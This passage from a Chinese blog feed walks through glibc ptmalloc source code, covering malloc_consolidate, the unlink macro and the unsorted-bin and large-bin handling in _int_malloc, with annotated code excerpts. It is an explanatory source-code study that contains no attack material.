class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p>再往下，将fastbin中的最大和最小的chunk对应的<code>malloc_chunk</code>指针赋值给<code>maxfb</code>和<code>fb</code>，然后通过do，while循环遍历fastbin中的每个chunk链表，<code>atomic_exchange_acq</code>又是一个CAS操作，该函数取出<code>fb</code>指针，并将原来的chunk链表头指针的值设为0，表示chunk链表空闲了。然后开始进入内层的循环，这里遍历的是每个chunk链表中的每个<code>malloc_chunk</code>指针。<br>接下来首先去除chunk中的<code>PREV_INUSE</code>和<code>NON_MAIN_ARENA</code>标志，为了获得chunk的大小（size中的最低三位被用来作为标志位，并且fastbin中chunk的标志位<code>IS_MMAPPED</code>默认为0）。然后通过<code>chunk_at_offset</code>和<code>chunksize</code>获得下一个chunk以及其大小，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">chunk_at_offset</span>(p, s)  ((mchunkptr) (((char *) (p)) + (s)))<br><span class="hljs-selector-id">#define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)<br><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">chunksize</span>(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))<br></code></pre></td></tr></table></figure><p>再往下，如果chunk的前一个chunk没在使用中，就合并该chunk与前一个chunk，主要是重新计算<code>malloc_chunk</code>的指针，并调用<code>unlink</code>将前一个chunk从bins数组中删除，</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br>    FD = P-&gt;fd;                                   <span class="hljs-string">\</span><br>    BK = P-&gt;bk;                                   <span class="hljs-string">\</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))             <span class="hljs-string">\</span><br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <span class="hljs-string">\</span><br>    <span class="hljs-keyword">else</span> &#123;                                    <span class="hljs-string">\</span><br>        FD-&gt;bk = BK;                                  <span class="hljs-string">\</span><br>        BK-&gt;fd = FD;                                  <span class="hljs-string">\</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                      <span class="hljs-string">\</span><br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, <span class="hljs-number">0</span>)) &#123;            <span class="hljs-string">\</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)        <span class="hljs-string">\</span><br>        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <span class="hljs-string">\</span><br>          malloc_printerr (check_action,                      <span class="hljs-string">\</span><br>                   <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <span class="hljs-string">\</span><br>                   P, AV);                        <span class="hljs-string">\</span><br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                    <span class="hljs-string">\</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                      <span class="hljs-string">\</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             <span class="hljs-string">\</span><br>                <span class="hljs-keyword">else</span> &#123;                                <span class="hljs-string">\</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 <span class="hljs-string">\</span><br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 <span class="hljs-string">\</span><br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 <span class="hljs-string">\</span><br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 <span class="hljs-string">\</span><br>                  &#125;                               <span class="hljs-string">\</span><br>              &#125; <span class="hljs-keyword">else</span> &#123;                                <span class="hljs-string">\</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             <span class="hljs-string">\</span><br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             <span class="hljs-string">\</span><br>              &#125;                                   <span class="hljs-string">\</span><br>          &#125;                                   <span class="hljs-string">\</span><br>      &#125;                                       <span class="hljs-string">\</span><br>&#125;<br></code></pre></td></tr></table></figure><p>简单来说，该宏定义就是将前一个chunk从两个双线链表中删除，<code>fd</code>和<code>bk</code>指针构成的双向链表存在于smallbin和largebin中，<code>fd_nextsize</code>和<code>bk_nextsize</code>指针构成的双向链表只存在于largebin中。<br>再往下，如果相邻的下一个chunk不是top chunk，并且下一个chunk不在使用中，就继续合并，否则，就清除下一个chunk的<code>PREV_INUSE</code>，表示该chunk已经空闲了。<br>然后将刚刚合并完的chunk添加进<code>unsorted_bin</code>中，<code>unsorted_bin</code>也是一个双向链表。<br>如果合并完的chunk属于smallbin的大小，则需要清除<code>fd_nextsize</code>和<code>bk_nextsize</code>，因为smallbin中的chunk不会使用这两个指针。并且通过<code>setHead</code>保证不会有相邻的两个chunk都空闲，并且通过<code>setFoot</code>设置下一个chunk的<code>prev_size</code>。<br>如果相邻的下一个chunk是top chunk，则将合并完的chunk继续合并到top chunk中。<br>至此，<code>malloc_consolidate</code>就分析完了，总结一下，<code>malloc_consolidate</code>就是遍历fastbin中每个chunk链表的每个<code>malloc_chunk</code>指针，合并前一个不在使用中的chunk，如果后一个chunk是top chunk，则直接合并到top chunk中，如果后一个chunk不是top chunk，则合并后一个chunk并添加进<code>unsorted_bin</code>中。</p><p>下一章继续往下分析_int_malloc函数。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码分析——4</title>
    <link href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%944/"/>
    <url>/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%944/</url>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>中的fastbin、smallbin和部分largebin的处理，本章继续往下看余下的代码。最后会对整个<code>_int_malloc</code>做一个总结。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> * _int_malloc(mstate av, size_t bytes) &#123;<br><br>...<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        int iters = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> <span class="hljs-function"><span class="hljs-params">((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span>&#123;</span><br><span class="hljs-function">            <span class="hljs-title">bck</span> = <span class="hljs-title">victim</span>-&gt;</span>bk;<br>            <span class="hljs-keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>                    || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>                malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br>            size = chunksize(victim);<br><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>            bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;<br>                remainder_size = size - nb;<br>                remainder = chunk_at_offset(victim, nb);<br>                unsorted_chunks <span class="hljs-function"><span class="hljs-params">(av)</span>-&gt;</span>bk = unsorted_chunks <span class="hljs-function"><span class="hljs-params">(av)</span>-&gt;</span>fd = remainder;<br>                av-&gt;last_remainder = remainder;<br>                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;<br>                    remainder-&gt;fd_nextsize = NULL;<br>                    remainder-&gt;bk_nextsize = NULL;<br>                &#125;<br><br>                set_head(victim,<br>                        nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                set_head(remainder, remainder_size | PREV_INUSE);<br>                set_foot(remainder, remainder_size);<br><br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-literal">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>            unsorted_chunks <span class="hljs-function"><span class="hljs-params">(av)</span>-&gt;</span>bk = bck;<br>            bck-&gt;fd = unsorted_chunks (av);<br><br>            <span class="hljs-keyword">if</span> (size == nb) &#123;<br>                set_inuse_bit_at_offset(victim, size);<br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-literal">void</span> *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>            ...<br><br>        &#125;<br><br>    ...<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分代码的整体意思就是遍历unsortedbin，从中查找是否有符合用户要求大小的chunk并返回。<br>第一个while循环从尾到头依次取出unsortedbin中的所有chunk，将该chunk对应的前一个chunk保存在<code>bck</code>中，并将大小保存在<code>size</code>中。<br>如果用户需要分配的内存大小对应的chunk属于smallbin，unsortedbin中只有这一个chunk，并且该chunk属于last remainder chunk且其大小大于用户需要分配内存大小对应的chunk大小加上最小的chunk大小（保证可以拆开成两个chunk），就将该chunk拆开成两个chunk，分别为<code>victim</code>和<code>remainder</code>，进行相应的设置后，将用户需要的<code>victim</code>返回。<br>如果不能拆开，就从unsortedbin中取出该chunk（<code>victim</code>）。<br>再下来，如果刚刚从unsortedbin中取出的<code>victim</code>正好是用户需要的大小<code>nb</code>，就设置相应的标志位，直接返回该<code>victim</code>。</p><p>继续往下看<code>_int_malloc</code>函数，为了使整个代码结构清晰，这里保留了外层的for循环和while循环。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void * _int_malloc(mstate av, size_t bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        int iters = <span class="hljs-number">0</span>;<br>        <span class="hljs-function"><span class="hljs-title">while</span> ((victim = unsorted_chunks (av)-&gt;</span>bk) != unsorted_chunks (av))&#123;<br><br>            ...<br><br>            <span class="hljs-keyword">if</span> (in_smallbin_range(size)) &#123;<br>                victim_index = smallbin_index(size);<br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-function"><span class="hljs-title">fwd</span> = bck-&gt;</span>fd;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                victim_index = largebin_index(size);<br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-function"><span class="hljs-title">fwd</span> = bck-&gt;</span>fd;<br><br>                <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>                    size |= PREV_INUSE;<br>                    <span class="hljs-function"><span class="hljs-title">assert</span>((bck-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-function"><span class="hljs-title">if</span> ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>size)) &#123;<br>                        fwd = bck;<br>                        <span class="hljs-function"><span class="hljs-title">bck</span> = bck-&gt;</span>bk;<br><br>                        <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = fwd-&gt;</span>fd;<br>                        <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk_nextsize;<br>                        <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = victim-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize =<br>                                victim;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-function"><span class="hljs-title">assert</span>((fwd-&gt;</span>size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        <span class="hljs-function"><span class="hljs-title">while</span> ((unsigned long) size &lt; fwd-&gt;</span>size) &#123;<br>                            <span class="hljs-function"><span class="hljs-title">fwd</span> = fwd-&gt;</span>fd_nextsize;<br>                            <span class="hljs-function"><span class="hljs-title">assert</span>((fwd-&gt;</span>size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                        <span class="hljs-function"><span class="hljs-title">if</span> ((unsigned long) size == (unsigned long) fwd-&gt;</span>size)<br>                            <span class="hljs-function"><span class="hljs-title">fwd</span> = fwd-&gt;</span>fd;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd_nextsize = fwd;<br>                            <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span>bk_nextsize;<br>                            <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk_nextsize = victim;<br>                            <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = victim;<br>                        &#125;<br>                        <span class="hljs-function"><span class="hljs-title">bck</span> = fwd-&gt;</span>bk;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span><br>                    <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = victim-&gt;</span>bk_nextsize = victim;<br>            &#125;<br><br>            mark_bin(av, victim_index);<br>            <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>bk = bck;<br>            <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd = fwd;<br>            <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk = victim;<br>            <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = victim;<br><br>    #define MAX_ITERS       <span class="hljs-number">10000</span><br>            <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>                break;<br>        &#125;<br><br>    ...<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这部分代码的整体意思是如果从unsortedbin中取出的chunk不符合用户要求的大小，就将该chunk合并到smallbin或者largebin中。<br>首先如果取出的chunk（victim）属于smallbin，就通过<code>smallbin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取smallbin中对应位置的链表头指针保存在<code>bck</code>中，最后直接插入到smallbin中，由于smallbin中的chunk不使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，插入操作只需要更新<code>bk</code>和<code>fd</code>指针，具体的插入操作在后面。这里需解释一下，<code>fd_nextsize</code>指针指向的是chunk双向链表中下一个大小不同的chunk，<code>bk_nextsize</code>指向的是chunk双向链表中前一个大小不同的chunk。<br>如果取出的chunk（victim）属于largebin，通过<code>largebin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取largebin链表头指针保存在<code>bck</code>中。<br>如果<code>fwd</code>等于<code>bck</code>，即<code>bck-&gt;fd=bck</code>，则表示largebin中对应位置上的chunk双向链表为空，直接进入后面的else部分中，代码<code>victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim</code>表示插入到largebin中的victim是唯一的chunk，因此其<code>fd_nextsize</code>和<code>bk_nextsize</code>指针都指向自己。<br>如果<code>fwd</code>不等于<code>bck</code>，对应的chunk双向链表存在空闲chunk，这时就要在该链表中找到合适的位置插入了。因为largebin中的chunk链表是按照chunk大小从大到小排序的，如果<code>victim</code>的<code>size</code>小于<code>bck-&gt;bk-&gt;size</code>即最后一个chunk的大小，则表示即将插入<code>victim</code>的大小在largebin的chunk双向链表中是最小的，因此要把<code>victim</code>插入到该链表的最后。在这种情况下，经过操作后的结果如下所示（因为我手边的画图软件有限，这里就用符号“|”隔出数组，然后从代码中摘除核心的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针的修改操作，对照这两个指针的意思，很容易看懂），</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">| <span class="hljs-function"><span class="hljs-title">fwd</span>（头指针） | fwd-&gt;</span>fd | ... | bck | victim（插入到末尾） |<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk_nextsize = victim<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = victim<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span> = fwd-&gt;</span>fd<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk_nextsize<br></code></pre></td></tr></table></figure><p>如果要插入的<code>victim</code>的<code>size</code>不是最小的，就要通过一个while循环遍历找到合适的位置，这里是从双向链表头<code>bck-&gt;fd</code>开始遍历，利用<code>fd_nextsize</code>加快遍历的速度，找到第一个<code>size&gt;=fwd-&gt;size</code>的chunk。如果<code>size=fwd-&gt;size</code>，就只是改变<code>victim</code>以及前后相应chunk的<code>bk</code>、<code>fd</code>指针就行。这里要特别注意，先做一个假设，假设chunk双向链表中A、B、C是三个不同大小的chunk集合，A集合有A0&#x3D;A1&#x3D;…，B集合有B0&#x3D;B1&#x3D;…，C集合有C0&#x3D;C1&#x3D;…，然后构造chunk链表，<br>| A0 | A1 | A2 | B0 | B1 | B2 | C0 | C1 | C2 |<br>特别注意，在ptmalloc中，只有A0、B0、C0可以配置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，其他位置是不用配置这两个指针的。因此相同大小的chunk只有最低地址的chunk会设置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针。根据这个假设，很容易知道当两个size相等时，为什么要执行<code>fwd = fwd-&gt;fd</code>，因为要保证插入victim的位置是相同大小的chunk的右边，即高地址的地方。插入后的链表如下，</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">...|<span class="hljs-string"> bck </span>|<span class="hljs-string"> victim </span>|<span class="hljs-string"> fwd </span>|<span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>链表中所有chunk的<code>fd_nextsize</code> 和<code>bk_nextsize</code>指针不变。<br>再往下，如果<code>size</code>不相等，则直接插入在<code>fwd</code>的左边，这样也能保证所有的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针设置在相同chunk大小的最地地址处（最左边）。插入后的链表如下，</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">...| bck | victim | fwd |...<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd_nextsize = fwd<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span>bk_nextsize;<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk_nextsize = victim<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = victim<br></code></pre></td></tr></table></figure><p>再往下，<code>mark_bin</code>用来标识<code>malloc_state</code>中的<code>binmap</code>，标识相应位置的chunk空闲。然后就更改<code>fd</code>、<code>bk</code>指针，插入到双向链表中，这个插入操作同时适用于smallbin和largebin，因此放在这里。最后如果在unsortedbin中处理了超过10000个chunk，就直接退出循环，这里保证不会因为unsortedbin中chunk太多，处理的时间太长了。<br>在这部分代码中，有个<code>size |= PREV_INUSE</code>是暂时让我比较费解的地方，经过分析后，暂时认为<code>size |= PREV_INUSE</code>是没必要的，虽然不会产生错误，也不会影响largebin中的排序，并且注释说这行代码能加速排序，但没看出能加速的地方，经过分析这里反而会多出一个无效的指针赋值，希望往后看代码时能解决这里的问题，或者希望有人能解答这行代码的具体作用。</p><p>回到<code>_int_malloc</code>函数中，继续往下看，为了使整个代码结构清晰，这里继续保留了外层的for循环。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void * _int_malloc(mstate av, size_t bytes) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br><br>        ...<br><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range(nb)) &#123;<br>            bin = bin_at (av, idx);<br><br>            <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin<br>                    &amp;&amp; (<span class="hljs-function"><span class="hljs-title">unsigned</span> long) (victim-&gt;</span>size) &gt;= (unsigned long) (nb)) &#123;<br>                <span class="hljs-function"><span class="hljs-title">victim</span> = victim-&gt;</span>bk_nextsize;<br>                <span class="hljs-keyword">while</span> (((unsigned long) (size = chunksize(victim))<br>                        &lt; (unsigned long) (nb)))<br>                    <span class="hljs-function"><span class="hljs-title">victim</span> = victim-&gt;</span>bk_nextsize;<br><br>                <span class="hljs-function"><span class="hljs-title">if</span> (victim != last(bin) &amp;&amp; victim-&gt;</span><span class="hljs-function"><span class="hljs-title">size</span> == victim-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>size)<br>                    <span class="hljs-function"><span class="hljs-title">victim</span> = victim-&gt;</span>fd;<br><br>                remainder_size = size - nb;<br>                unlink(av, victim, bck, fwd);<br><br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) &#123;<br>                    set_inuse_bit_at_offset(victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>size |= NON_MAIN_ARENA;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    remainder = chunk_at_offset(victim, nb);<br>                    bck = unsorted_chunks (av);<br>                    <span class="hljs-function"><span class="hljs-title">fwd</span> = bck-&gt;</span>fd;<br>                    <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely(fwd-&gt;</span>bk != bck)) &#123;<br>                        errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                        goto errout;<br>                    &#125;<br>                    <span class="hljs-function"><span class="hljs-title">remainder</span>-&gt;</span>bk = bck;<br>                    <span class="hljs-function"><span class="hljs-title">remainder</span>-&gt;</span>fd = fwd;<br>                    <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = remainder;<br>                    <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;<br>                        <span class="hljs-function"><span class="hljs-title">remainder</span>-&gt;</span>fd_nextsize = NULL;<br>                        <span class="hljs-function"><span class="hljs-title">remainder</span>-&gt;</span>bk_nextsize = NULL;<br>                    &#125;<br>                    set_head(victim,<br>                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head(remainder, remainder_size | PREV_INUSE);<br>                    set_foot(remainder, remainder_size);<br>                &#125;<br>                check_malloced_chunk (av, victim, nb);<br>                void *p = chunk2mem(victim);<br>                alloc_perturb(p, bytes);<br>                return p;<br>            &#125;<br>        &#125;<br><br>        ...<br><br>    